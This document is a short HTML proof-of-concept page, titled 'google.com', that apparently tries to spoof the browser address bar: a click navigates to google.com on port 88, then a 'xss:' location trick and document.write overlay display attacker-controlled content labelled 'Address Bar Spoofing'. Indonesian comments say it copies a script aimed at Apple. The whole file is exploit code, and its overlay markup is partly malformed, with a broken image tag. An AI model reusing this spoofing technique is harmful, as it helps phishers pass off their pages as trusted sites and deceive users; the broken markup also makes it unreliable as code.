<!DOCTYPE html>
<html>
<head>
  <title>google.com</title>
</head>
<body>

<center>
  <button id="img" onclick="a()">Click me</button>
  <div id="kata" style="display:none">Loading...</div>
</center>

<script>
function a() {
  // Sama persis seperti script Apple
  // tapi target google.com
  location = "http://www.google.com:88"
  
  document.getElementById("img").style.display = "none";
  document.getElementById("kata").style.display = "block";

  setTimeout(() => {
    location.replace('xss:')
    
    document.getElementById("kata").style.display = "none";

    setTimeout(() => {
      document.write(`
        <div style="
          position:fixed;
          inset:0;

          justify-content:center;
          align-items:center;
          font-family:Arial,sans-serif;
        ">

            src="https://i.giphy.com/NmdU9DLL2ostigH2iW.webp"
            style="width:400px;max-width:90vw;"
          >
          <div style="
            margin-top:20px;
            color:#fff;
            font-size:48px;
            font-weight:900;
            letter-spacing:4px;
            text-shadow:0 0 10px #fff;
          ">
            Address Bar Spoofing
          </div>
        </div>
      `);
    }, 500);

  }, 4000);
}
</script>

</html>
